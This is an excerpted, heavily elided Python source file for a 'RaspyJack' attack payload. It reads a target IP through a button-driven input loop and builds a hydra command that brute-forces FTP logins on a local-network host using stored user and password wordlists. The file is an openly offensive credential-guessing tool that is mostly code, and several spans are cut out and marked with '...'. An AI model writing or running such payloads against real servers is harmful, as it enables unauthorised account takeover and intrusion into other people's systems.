#!/usr/bin/env python3
"""
RaspyJack *payload* – **Attack: FTP Brute-Force**
==================================================
A payload that uses `hydra` to perform a dictionary-based brute-force
attack against an FTP server on the local network.
...
# --- CONFIGURATION ---
TARGET_IP = "192.168.1.21" # Default IP, will be configurable
USER_LIST = "/root/Raspyjack/wordlists/ftp_users.txt"
PASS_LIST = "/root/Raspyjack/wordlists/ftp_pass.txt"
...
found_creds = ""
current_ip_input = "192.168.1.21" # Initial value for IP input
    ...
    while running:
        ...
        if btn == "OK": # Confirm IP
            ...
            if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                ...
                time.sleep(2)
                current_ip_input = "192.168.1.21" # Reset to default
...
def run_attack(target_ip):
    ...
    try:
        command = f"hydra -L {USER_LIST} -P {PASS_LIST} -t 4 -o {output_file} ftp://{target_ip}"
